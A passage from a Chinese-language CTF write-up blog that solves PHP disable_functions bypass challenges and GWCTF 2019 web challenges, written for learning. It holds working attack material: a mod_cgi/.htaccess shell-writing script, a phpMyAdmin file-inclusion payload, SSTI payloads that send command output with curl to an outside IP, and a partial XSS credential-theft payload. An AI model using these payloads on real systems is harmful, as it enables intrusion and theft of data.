class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ? $yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>])) &#123;</span><br><span class="line">@file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>] . <span class="string">'?checked=true'</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$modcgi = in_array(<span class="string">'mod_cgi'</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">$writable = is_writable(<span class="string">'.'</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">$htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">checkEnabled(<span class="string">"Mod-Cgi enabled"</span>, $modcgi, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line">checkEnabled(<span class="string">"Is writable"</span>, $writable, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line">checkEnabled(<span class="string">"htaccess working"</span>, $htaccess, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line"><span class="keyword">if</span> (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Error. All of the above must be true for the script to work!"</span>; <span class="comment">//abort if not</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">checkEnabled(<span class="string">"Backing up .htaccess"</span>, copy(<span class="string">".htaccess"</span>, <span class="string">".htaccess.bak"</span>), <span class="string">"Suceeded! Saved in .htaccess.bak"</span>, <span class="string">"Failed!"</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">checkEnabled(<span class="string">"Write .htaccess file"</span>, file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">checkEnabled(<span class="string">"Write shell file"</span>, file_put_contents(<span class="string">'shell.dizzle'</span>, $shellfile), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//write the file</span></span><br><span class="line">checkEnabled(<span class="string">"Chmod 777"</span>, chmod(<span class="string">"shell.dizzle"</span>, <span class="number">0777</span>), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//rwx</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="comment">//call the script</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题解题的时候就是用的这个脚本。</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>进入题目常规操作，蚁剑连接，注意连接的时候编码器需要选择<code>base64</code>。同样是终端输入命令无效。看一下phpinfo，可以发现，支持<code>cgi</code>，同时根据题目描述，利用<code>cgi</code>进行bypass，还是两种方式：蚁剑bypass插件 or 手工bypass。</p><h4 id="利用蚁剑插件-1"><a href="#利用蚁剑插件-1" class="headerlink" title="利用蚁剑插件"></a>利用蚁剑插件</h4><p>模式选择<code>Apache_mod_cgi</code>即可，详细参考<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">这里</a>。</p><h4 id="手工bypass-1"><a href="#手工bypass-1" class="headerlink" title="手工bypass"></a>手工bypass</h4><p>前面说了，这题用的l3m0n师傅的脚本，直接将<code>exp.php</code>(前面贴的代码)上传到web文件夹，并访问该文件，回显如下：<br><img src="http://www.ggb0n.cool/images/ctfhub18.png" alt=""></p><p>再看蚁剑里的情况：<br><img src="http://www.ggb0n.cool/images/ctfhub20.png" alt=""></p><p>可以发现，多了几个文件，其中<code>shell.dizzle</code>文件里包含我们要执行的命令，我们通过更改该文件即可拿到flag(这里注意：<code>/flag</code>是644权限，<code>www-data</code>用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 <code>tac</code> 命令(具体看 <code>/start.sh</code>)来获取 flag)：<br><img src="http://www.ggb0n.cool/images/ctfhub19.png" alt=""></p><p>然后在浏览器访问<code>shell.dizzle</code>即可拿到flag了。</p><p>可参考：<br><a href="https://www.anquanke.com/post/id/195686">https://www.anquanke.com/post/id/195686</a></p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>利用Json序列化程序中的堆溢出进行bypass。</p><h3 id="关于利用Json-Serializer-UAF-bypass"><a href="#关于利用Json-Serializer-UAF-bypass" class="headerlink" title="关于利用Json_Serializer_UAF bypass"></a>关于利用Json_Serializer_UAF bypass</h3><blockquote><p><code>PHP-Json-bypass</code>漏洞利用<code>json序列化</code>程序中的<code>堆溢出</code>触发，以绕过functions_disable并执行系统命令，影响范围是<code>Linux</code>，<code>php 7.1-7.3</code>。</p></blockquote><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>1、Linux 操作系统</li><li>2、PHP 版本：7.1 - all versions to date、7.2 &lt; 7.2.19 (released: 30 May 2019)、7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h4 id="bypass流程-3"><a href="#bypass流程-3" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、查看PHP版本</li><li>2、上传exp执行或者利用蚁剑插件bypass</li></ul><p>这里附一个网上找到大师傅写的<a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">exp</a>。我从师傅那里也fork了exp的库，可到我的github共同学习。</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>进入题目，仍然给了小马，连接上仍然没有权限。可以选择利用蚁剑插件或者上面的exp进行bypass拿到<code>www-data</code>的用户权限。（再提示一下：bypass插件只有Linux下的蚁剑可用哦）</p><h4 id="利用蚁剑插件-2"><a href="#利用蚁剑插件-2" class="headerlink" title="利用蚁剑插件"></a>利用蚁剑插件</h4><p>参考官方的<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6">wp</a>，我们来实现一下。</p><p>连接上之后，在主页面选择<code>绕过disable_functions</code>插件：<br><img src="http://www.ggb0n.cool/images/ctfhub28.png" alt=""></p><p>然后选择<code>Json Serializer UAF</code>–&gt;开始bypass<br><img src="http://www.ggb0n.cool/images/ctfhub29.png" alt=""></p><p>之后就能拿到<code>www-data</code>权限的shell了，注意这个用户权限不足以读取flag，因此<code>cat</code>命令读取不到flag，需要用<code>tac</code>命令来读取：<br><img src="http://www.ggb0n.cool/images/ctfhub30.png" alt=""></p><h4 id="手工bypass-2"><a href="#手工bypass-2" class="headerlink" title="手工bypass"></a>手工bypass</h4><p>exp已经给了，自己可以尝试下，这两天事情多，几个题都是用蚁剑秒的。</p><p>参考：<br><a href="https://www.anquanke.com/post/id/195686#h3-4">https://www.anquanke.com/post/id/195686#h3-4</a><br><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6</a></p><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>在服务器支持<code>PHP-FPM</code>的情况下，利用PHP的内核变量进行bypass，原理与利用LD-PRELOAD进行bypass是一样的。</p><h3 id="关于利用PHP-FPM-bypass"><a href="#关于利用PHP-FPM-bypass" class="headerlink" title="关于利用PHP-FPM bypass"></a>关于利用PHP-FPM bypass</h3><blockquote><p><code>Fastcgi</code> 是一种通讯协议，用于Web服务器与后端语言的数据交换；<code>PHP-FPM</code>则是php环境中对<code>Fastcgi</code>协议的管理程序实现。</p><p>Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量。</p></blockquote><h4 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>1、PHP必须运行于<code>PHP-FPM/FastCGI</code>模式下</li><li>2、内核版本必须大于2.98</li><li>3、open_basedir = off</li></ul><h4 id="bypass流程-4"><a href="#bypass流程-4" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、查看phpinfo是否支持<code>PHP-FPM/FastCGI</code></li><li>2、上蚁剑插件 or exp</li></ul><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>进入题目，一如既往蚁剑连接，这个题其实与蚁剑原版有点出入，蚁剑题解里写的本题环境是支持<code>putenv</code>的，那就和利用LD_PRELOAD绕过姿势一样了，但是试了，没成功，后来用蚁剑插件的时候发现了问题。</p><h4 id="利用蚁剑插件-3"><a href="#利用蚁剑插件-3" class="headerlink" title="利用蚁剑插件"></a>利用蚁剑插件</h4><p>像前面的操作一样：选择上bypass插件 -&gt; 选择模式 -&gt; FPM/FCGI<br>这个时候发现问题所在了：<br><img src="http://www.ggb0n.cool/images/ctfhub22.png" alt=""></p><p>可以看到，本题环境并没有<code>putenv</code>，用LD_PRELOAD的姿势能过就怪了…</p><p>然后在地址里选上最后一个并开始：<br><img src="http://www.ggb0n.cool/images/ctfhub24.png" alt=""></p><p>成功执行之后，连接上题目环境，再刷新一下web目录看一下：<br><img src="http://www.ggb0n.cool/images/ctfhub23.png" alt=""></p><p>发现多了一个<code>.antproxy.php</code>没错！这就是蚁剑写入的另一个shell文件，我们回去把连接shell的url换成这个shell文件的url，链接密码不变，例如：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">url：http://change-<span class="number">123456</span>/<span class="keyword">shell</span>.<span class="bash">php，连接密码：cmd</span></span><br><span class="line">改为</span><br><span class="line">url：http://change-<span class="number">123456</span>/.antproxy.php，连接密码：<span class="keyword">cmd</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub25.png" alt=""></p><p>再次连接即可拿到拥有<code>www-data</code>权限的shell，注意此时<code>cat</code>命令还是读取不到flag的，需要用<code>tac</code>命令来拿到flag:<br><img src="http://www.ggb0n.cool/images/ctfhub27.png" alt=""></p><p>参考：<br><a href="https://www.freebuf.com/articles/web/82801.html">https://www.freebuf.com/articles/web/82801.html</a><br><a href="https://www.anquanke.com/post/id/195686#h3-4">https://www.anquanke.com/post/id/195686#h3-4</a></p><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>利用<code>GC UAF</code>导致的PHP代码执行漏洞进行bypass</p><h3 id="关于利用GC-UAF"><a href="#关于利用GC-UAF" class="headerlink" title="关于利用GC UAF"></a>关于利用GC UAF</h3><blockquote><p>PHP是一门托管型语言，在PHP编程中程序员不需要手工处理内存资源的分配与释放(使用C编写PHP或Zend扩展除外)，这就意味着PHP本身实现了垃圾回收机制(Garbage Collection)。</p><p>该机制存在UAF漏洞，利用该漏洞可以执行命令等，也可以完成对functions_disable的bypass</p></blockquote><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>PHP版本满足：</p><p>7.0 - all versions to date</p><p>7.1 - all versions to date</p><p>7.2 - all versions to date</p><p>7.3 - all versions to date</p></li></ul><h4 id="bypass流程-5"><a href="#bypass流程-5" class="headerlink" title="bypass流程"></a>bypass流程</h4><ul><li>1、查看PHP版本信息</li><li>2、利用蚁剑插件 or exp</li></ul><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>进入题目，蚁剑连接，查看phpinfo发现满足要求，那么即可利用该方式进行bypass</p><h4 id="利用蚁剑插件-4"><a href="#利用蚁剑插件-4" class="headerlink" title="利用蚁剑插件"></a>利用蚁剑插件</h4><p>蚁剑连接之后，选择上bypass插件 -&gt; 选择模式 -&gt; GC UAF<br><img src="http://www.ggb0n.cool/images/ctfhub31.png" alt=""></p><p>然后点击开始，即可拿到<code>www-data</code>权限的shell，利用<code>tac</code>命令即可读到flag：<br><img src="http://www.ggb0n.cool/images/ctfhub32.png" alt=""></p><h4 id="手工bypass-3"><a href="#手工bypass-3" class="headerlink" title="手工bypass"></a>手工bypass</h4><p>可以利用这个<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">exp</a>进行</p><p>参考：<br><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7</a><br><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p><strong>持续更新。。。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不得不说，Line师傅们在技能树里安排的这个分支真是太棒了！作为一名菜鸡，之前只是对&lt;code&gt;bypass functions_disable&lt;/code&gt;有比较少并且不清晰的理解，但是刷了这部分题相当于系统地学习了一遍，帮助很大！
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="CTFHub刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CTFHub%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="渗透神器-蚁剑" scheme="http://ggb0n.cool/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8-%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF2019复现</title>
    <link href="http://ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-04T13:48:34.000Z</published>
    <updated>2020-04-22T00:14:24.619Z</updated>
    
    <content type="html"><![CDATA[<p>去年安恒决赛，同时还进行着GWCT，当时没做，现在复现复现💩<a id="more"></a></p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>考察[CVE-2018-12613]-PhpMyadmin后台文件包含漏洞，参考<a href="https://www.jianshu.com/p/fb9c2ae16d09">这里</a>。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>扫后台发现<code>robots.txt</code>和<code>phpmyadmin</code>两个页，进入<code>phpmyadmin</code>发现版本是<code>4.8.1</code>的，上面说到的漏洞刚好支持的是<code>4.8.0</code>和<code>4.8.1</code>，因此拿payload尝试一下，发现直接能打通：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p>那么再构造payload拿flag就行了：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">index.php<span class="regexp">/?target=db_sql.php%253f/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>考察php伪随机的漏洞：如果<code>mt_srand()</code>使用同一个<code>seed</code>，生成的随机数是可以爆破出<code>seed</code>的。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>查看源码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#div1"</span>).load(<span class="string">"check.php #p1"</span>);</span><br><span class="line">$(<span class="string">".close"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">"#myAlert"</span>).hide();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到，存在<code>check.php</code>，访问该页面可以拿到如下源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>可以看到，存在<code>mt_srand()</code>，<code>mt_rand()</code>两个函数，并且<code>session</code>是用的随机数设置的，那么先将伪随机数转化为<code>php_mt_seed</code>可识别的数据：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'VJozuuy4YQ'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>（res）</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/gwctf05.png" alt=""></p><p>然后用<code>php_mt_seed</code>爆破伪随机数：</p><p><img src="http://www.ggb0n.cool/images/gwctf01.png" alt=""></p><p>然后利用题目源码，构造POC：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">980044562</span>);</span><br><span class="line"></span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把结果输入即可拿到flag</p><p><img src="http://www.ggb0n.cool/images/gwctf02.png" alt=""></p><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>考察flask的<code>SSTI</code>，以及利用<code>curl</code>反弹shell</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个输入框，很容易想到是sql注入，但是试了好一会儿没有效果，抓包看返回头可以得知是python的后端，因此认定是SSTI。</p><p>用<code>2</code>进行测试时报错，猜想是双括号被ban了，后来用<code>{}</code>与<code>%</code>组合的方式可以，但是还有很多关键词被ban了，参考到一位师傅的题解，发现他认为后端的过滤是这么写的：(应该是FUZZ出来的吧)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">'import'</span>, <span class="string">'getattr'</span>, <span class="string">'os'</span>, <span class="string">'class'</span>, <span class="string">'subclasses'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">                 <span class="string">' subprocess'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'popen'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'local'</span>,</span><br><span class="line">                 <span class="string">'self'</span>, <span class="string">'item'</span>, <span class="string">'getitem'</span>, <span class="string">'getattribute'</span>, <span class="string">'func_globals'</span>, <span class="string">'config'</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p>这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即<code>if=&gt;iconfigf</code>，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个<code>config</code>被替换之后，过滤也就结束了。</p><p>同时还要利用VPS来接收结果，在BUU中开了一台内网靶机，构造最终payload如下：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#获取文件名</span><br><span class="line">&#123;% iconfigf ''.<span class="module-access"><span class="module"><span class="identifier">__claconfigss__</span>.</span><span class="module"><span class="identifier">__mconfigro__</span>[</span></span><span class="number">2</span>].<span class="constructor">__subclaconfigsses__()</span><span class="literal">[<span class="number">59</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http:<span class="comment">//174.0.231.221:1234/ -d `ls /`;') %&#125;1&#123;% endiconfigf %&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#拿flag</span><br><span class="line">&#123;% iconfigf ''.<span class="module-access"><span class="module"><span class="identifier">__claconfigss__</span>.</span><span class="module"><span class="identifier">__mconfigro__</span>[</span></span><span class="number">2</span>].<span class="constructor">__subclasconfigses__()</span><span class="literal">[<span class="number">59</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http:<span class="comment">//174.0.231.221:1234/ -d `cat /flag_1s_Hera`;') %&#125;1&#123;% endiconfigf %&#125;</span></span><br></pre></td></tr></table></figure><p>成功打出flag：</p><p><img src="http://www.ggb0n.cool/images/gwctf06.png" alt=""></p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>考察<code>XSS</code></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>注册并登录之后，在<code>feedback</code>页面看到了一个大大的输入框，查看源码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">echo <span class="string">"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist =[<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line">foreach ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    $feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过观察黑名单中的内容，又是一个大大的输入框，指定是<code>XSS</code>了，参考别的师傅的题解讲到本题存在<code>CSP</code>，不能注入外部的JS，那肯定就需要在内部JS上动手脚，逐个页面看源码，结果在登陆页面看到存在<code>login.js</code>，源码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line"><span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line"><span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里记住密码功能会从<code>Cookie</code>中取出用户名和密码并赋值给<code>username</code>和<code>password</code>，因此我们可以利用这个内部JS来构造payload进行XSS，这里我们可以用BUU的<a href="http://http.requestbin.buuoj.cn/">requestbin</a>来接受反馈。</p><p>在<code>feedback</code>页面构造如下payload提交：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;<span class="regexp">/inpcookieut&gt;</span></span><br><span class="line"><span class="regexp">&lt;inpcookieut type="text" name="password"&gt;&lt;/i</span>npcookieut&gt;</span><br><span class="line">&lt;scricookiept scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;<span class="regexp">/scricookiept&gt;</span></span><br><span class="line"><span class="regexp">&lt;scricookiept&gt;</span></span><br><span class="line"><span class="regexp">var uname = documcookieent.getElemcookieentsByName("username")[0].value;</span></span><br><span class="line"><span class="regexp">var passwd = 